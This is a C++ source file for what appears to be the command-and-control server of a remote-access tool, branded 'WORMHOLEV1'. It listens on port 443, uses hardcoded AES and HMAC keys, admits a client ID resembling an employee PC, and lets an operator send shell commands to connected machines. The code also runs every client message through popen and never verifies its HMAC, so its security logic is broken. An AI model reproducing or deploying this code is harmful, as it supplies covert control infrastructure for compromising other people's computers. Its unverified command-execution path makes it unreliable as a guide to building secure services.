#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include <mutex>
#include <algorithm>
#include <chrono>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/err.h>

using namespace std;
using namespace chrono;

#define BUFFER_SIZE 262144
#define AES_KEY_SIZE 256
#define AES_BLOCK_SIZE 16
#define HEARTBEAT_INTERVAL 30000
#define CONNECTION_TIMEOUT 5000
#define HMAC_KEY_SIZE 32

struct CryptoContext {
    unsigned char hmac_key[HMAC_KEY_SIZE] = {
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC
    };
};

map<string, pair<int, steady_clock::time_point>> clients;
mutex clients_mutex;
mutex console_mutex;
bool server_running = true;

unsigned char aes_key[AES_KEY_SIZE / 8] = {
    0x73, 0x2F, 0x91, 0xCE, 0x44, 0x18, 0x6B, 0x3D,
    0xF1, 0xA0, 0xD4, 0x7E, 0x88, 0xC5, 0x2A, 0x9B,
    0x60, 0x13, 0xFD, 0x47, 0xAE, 0x3C, 0xB9, 0x5E,
    0x9F, 0x04, 0x22, 0x6D, 0xC0, 0x87, 0x1A, 0x73
};

unsigned char iv[AES_BLOCK_SIZE] = {
    0xD2, 0x5C, 0xE3, 0x1A, 0x77, 0x9B, 0x48, 0x06,
    0xB5, 0x39, 0x61, 0xEF, 0x2D, 0xC8, 0x7A, 0x11
};

CryptoContext cryptoContext;

string GenerateHMAC(const string& message, const unsigned char* key, size_t keySize) {
    unsigned char* digest = HMAC(EVP_sha256(), key, keySize,
        (unsigned char*)message.c_str(), message.size(), NULL, NULL);
    if (!digest) {
        return "";
    }
    return string((char*)digest, EVP_MD_size(EVP_sha256()));
}

string DecryptMessage(const string& ciphertext, const unsigned char* iv, size_t ivSize) {
    if (ciphertext.empty()) {
        throw runtime_error("Empty ciphertext");
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        throw runtime_error("EVP_CIPHER_CTX_new failed");
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_DecryptInit_ex failed");
    }

    string plaintext;
    plaintext.resize(ciphertext.size() + AES_BLOCK_SIZE);
    int len = 0;
    int plaintext_len = 0;

    if (EVP_DecryptUpdate(ctx, (unsigned char*)&plaintext[0], &len,
        (unsigned char*)ciphertext.c_str(), ciphertext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_DecryptUpdate failed");
    }
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, (unsigned char*)&plaintext[0] + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_DecryptFinal_ex failed");
    }
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(plaintext_len);

    plaintext.erase(remove_if(plaintext.begin(), plaintext.end(),
        [](char c) { return (c < 32 && c != '\n' && c != '\r' && c != '\t') || c > 126; }),
        plaintext.end());

    return plaintext;
}

string EncryptMessage(const string& plaintext, const unsigned char* iv, size_t ivSize) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        throw runtime_error("EVP_CIPHER_CTX_new failed");
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, iv) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_EncryptInit_ex failed");
    }

    string ciphertext;
    ciphertext.resize(plaintext.size() + AES_BLOCK_SIZE);
    int len = 0;
    int ciphertext_len = 0;

    if (EVP_EncryptUpdate(ctx, (unsigned char*)&ciphertext[0], &len,
        (unsigned char*)plaintext.c_str(), plaintext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_EncryptUpdate failed");
    }
    ciphertext_len = len;

    if (EVP_EncryptFinal_ex(ctx, (unsigned char*)&ciphertext[0] + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        throw runtime_error("EVP_EncryptFinal_ex failed");
    }
    ciphertext_len += len;

    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);

    return ciphertext;
}

void ProcessMessage(int clientSocket, const string& message) {
    try {
        string hmac = GenerateHMAC(message, cryptoContext.hmac_key, sizeof(cryptoContext.hmac_key));
        if (hmac.empty()) {
            cerr << "HMAC generation failed" << endl;
            return;
        }

        string decrypted = DecryptMessage(message, iv, sizeof(iv));
        cout << "Decrypted message: " << decrypted << endl;

        string response = "Server received: " + decrypted;
        string encryptedResponse = EncryptMessage(response, iv, sizeof(iv));

        string responseHmac = GenerateHMAC(encryptedResponse, cryptoContext.hmac_key, sizeof(cryptoContext.hmac_key));
        string fullResponse = encryptedResponse + responseHmac;

        send(clientSocket, fullResponse.c_str(), fullResponse.size(), 0);
    }
    catch (const exception& e) {
        cerr << "Error processing message: " << e.what() << endl;
    }
}

void UpdateClientTimestamp(const string& client_id) {
    lock_guard<mutex> lock(clients_mutex);
    auto it = clients.find(client_id);
    if (it != clients.end()) {
        it->second.second = steady_clock::now();
    }
}

bool SendEncrypted(int sock, const string& message) {
    try {
        string encrypted = EncryptMessage(message, iv, sizeof(iv));
        if (send(sock, encrypted.c_str(), encrypted.size(), 0) < 0) {
            return false;
        }
        return true;
    }
    catch (...) {
        return false;
    }
}

void HandleClient(int client_socket, sockaddr_in client_addr) {
    char buffer[BUFFER_SIZE];
    string client_id;
    string client_ip = inet_ntoa(client_addr.sin_addr);

    try {
        struct timeval timeout;
        timeout.tv_sec = CONNECTION_TIMEOUT / 1000;
        timeout.tv_usec = (CONNECTION_TIMEOUT % 1000) * 1000;
        setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            throw runtime_error("Failed to receive client ID");
        }
        buffer[bytes_received] = '\0';

        client_id = DecryptMessage(string(buffer, bytes_received), iv, sizeof(iv));
        if (client_id.empty()) {
            throw runtime_error("Empty client ID");
        }

        if (client_id != "emp_pc_1") {
            SendEncrypted(client_socket, "ERROR: Invalid client ID");
            throw runtime_error("Invalid client ID: " + client_id);
        }

        if (!SendEncrypted(client_socket, "ACK")) {
            throw runtime_error("Failed to send ACK");
        }

        timeout.tv_sec = (HEARTBEAT_INTERVAL + 5000) / 1000;
        timeout.tv_usec = ((HEARTBEAT_INTERVAL + 5000) % 1000) * 1000;
        setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        {
            lock_guard<mutex> lock(clients_mutex);
            clients[client_id] = { client_socket, steady_clock::now() };
        }

        {
            lock_guard<mutex> lock(console_mutex);
            cout << "[+] Client '" << client_id << "' joined from " << client_ip << endl;
        }

        while (server_running) {
            bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
            if (bytes_received <= 0) {
                if (errno == EWOULDBLOCK || errno == EAGAIN) {
                    if (!SendEncrypted(client_socket, "PING")) {
                        break;
                    }
                    continue;
                }
                break;
            }
            buffer[bytes_received] = '\0';

            string encrypted_msg(buffer, bytes_received);
            string message;

            try {
                message = DecryptMessage(encrypted_msg, iv, sizeof(iv));
            }
            catch (const exception& e) {
                lock_guard<mutex> lock(console_mutex);
                cerr << "Decryption error from " << client_ip << ": " << e.what() << endl;
                continue;
            }

            if (message == "heartbeat") {
                UpdateClientTimestamp(client_id);
                try {
                    if (!SendEncrypted(client_socket, "ALIVE")) {
                        throw runtime_error("Failed to send ALIVE response");
                    }
                }
                catch (const exception& e) {
                    throw runtime_error(string("ALIVE send error: ") + e.what());
                }
                continue;
            }

            if (message == "exit") {
                lock_guard<mutex> lock(console_mutex);
                cout << "[-] Client '" << client_id << "' disconnected" << endl;
                break;
            }

            if (!message.empty()) {
                lock_guard<mutex> lock(console_mutex);
                cout << "\n[Command from " << client_id << "]: " << message << endl;
                
                // Execute command and send response
                string response;
                FILE* pipe = popen(message.c_str(), "r");
                if (pipe) {
                    char cmd_buffer[128];
                    while (fgets(cmd_buffer, sizeof(cmd_buffer), pipe) != NULL) {
                        response += cmd_buffer;
                    }
                    pclose(pipe);
                } else {
                    response = "Failed to execute command";
                }
                
                if (!SendEncrypted(client_socket, response)) {
                    cerr << "Failed to send command response to client" << endl;
                }
            }
        }
    }
    catch (const exception& e) {
        lock_guard<mutex> lock(console_mutex);
        cerr << "Error with client " << client_ip;
        if (!client_id.empty()) {
            cerr << " (" << client_id << ")";
        }
        cerr << ": " << e.what() << endl;
    }

    if (!client_id.empty()) {
        lock_guard<mutex> lock(clients_mutex);
        clients.erase(client_id);
    }
    close(client_socket);
}

void StartServer(int port) {
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        throw runtime_error("Socket creation failed");
    }

    int enable = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) < 0) {
        close(server_socket);
        throw runtime_error("Setsockopt failed");
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);

    if (bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        close(server_socket);
        throw runtime_error("Bind failed");
    }

    if (listen(server_socket, SOMAXCONN) < 0) {
        close(server_socket);
        throw runtime_error("Listen failed");
    }

    {
        lock_guard<mutex> lock(console_mutex);
        cout << "[*] Server started on port " << port << endl;
        cout << "[*] Listening on all interfaces (INADDR_ANY)" << endl;
        cout << "[*] Type 'list' to see the connected clients\n";
        cout << "[*] Type 'exit' to shut down the server\n";
    }

    while (server_running) {
        sockaddr_in client_addr;
        socklen_t client_addr_size = sizeof(client_addr);
        int client_socket = accept(server_socket, (sockaddr*)&client_addr, &client_addr_size);

        if (client_socket < 0) {
            if (!server_running) break; // Server is shutting down
            lock_guard<mutex> lock(console_mutex);
            cerr << "Accept error" << endl;
            continue;
        }

        thread(HandleClient, client_socket, client_addr).detach();
    }

    close(server_socket);
}

void ListClients() {
    lock_guard<mutex> lock(clients_mutex);
    if (clients.empty()) {
        cout << "No connected clients" << endl;
        return;
    }

    cout << "Connected clients (" << clients.size() << "):\n";
    auto now = steady_clock::now();

    for (const auto& [id, client] : clients) {
        auto duration = duration_cast<seconds>(now - client.second).count();
        cout << "- " << id << " (" << duration << " sec ago)\n";
    }
}

void CleanupInactiveClients() {
    lock_guard<mutex> lock(clients_mutex);
    auto now = steady_clock::now();
    auto threshold = HEARTBEAT_INTERVAL * 2 / 1000;

    for (auto it = clients.begin(); it != clients.end(); ) {
        auto duration = duration_cast<seconds>(now - it->second.second).count();
        if (duration > threshold) {
            close(it->second.first);
            it = clients.erase(it);
        }
        else {
            ++it;
        }
    }
}

void CommandInterface() {
    cout << R"(
██╗    ██╗ ██████╗ ██████╗ ███╗   ███╗██╗  ██╗ ██████╗ ██╗     ███████╗██╗   ██╗ ██╗
██║    ██║██╔═══██╗██╔══██╗████╗ ████║██║  ██║██╔═══██╗██║     ██╔════╝██║   ██║███║
██║ █╗ ██║██║   ██║██████╔╝██╔████╔██║███████║██║   ██║██║     █████╗  ██║   ██║╚██║
██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║██║   ██║██║     ██╔══╝  ╚██╗ ██╔╝ ██║
╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗███████╗ ╚████╔╝  ██║
 ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝  ╚═══╝   ╚═╝
)";

    cout << "\nStarting secure command server...\n";
    cout << "[*] Server started on port 443\n";
    cout << "[*] Type 'list' to see connected clients\n";
    cout << "[*] Type 'exit' to shut down the server\n";

    while (server_running) {
        cout << "\n[Server Command]> ";
        string input;
        getline(cin, input);

        if (input.empty()) continue;

        if (input == "exit") {
            server_running = false;
            break;
        }

        if (input == "list") {
            ListClients();
            continue;
        }

        if (input == "clean") {
            CleanupInactiveClients();
            cout << "Inactive clients removed\n";
            continue;
        }

        size_t space_pos = input.find(' ');
        if (space_pos == string::npos) {
            cout << "Available commands:\n";
            cout << "list - Show connected clients\n";
            cout << "clean - Remove inactive clients\n";
            cout << "exit - Shutdown server\n";
            cout << "<client_id> <command> - Send command to client\n";
            continue;
        }

        string client_id = input.substr(0, space_pos);
        string command = input.substr(space_pos + 1);

        lock_guard<mutex> lock(clients_mutex);
        auto it = clients.find(client_id);
        if (it == clients.end()) {
            cout << "Client '" << client_id << "' not found\n";
            continue;
        }

        if (!SendEncrypted(it->second.first, command)) {
            cout << "Failed to send command to client '" << client_id << "'\n";
        }
        else {
            cout << "Command sent to client '" << client_id << "'\n";
        }
    }
}

int main() {
    cout << "Starting secure command server...\n";

    // Initialize OpenSSL
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    try {
        thread server_thread(StartServer, 443);
        this_thread::sleep_for(milliseconds(100));

        CommandInterface();

        // Clean up
        server_running = false;
        server_thread.join();
    }
    catch (const exception& e) {
        cerr << "Critical error: " << e.what() << endl;
        return 1;
    }

    // Clean up OpenSSL
    EVP_cleanup();
    ERR_free_strings();

    return 0;
}
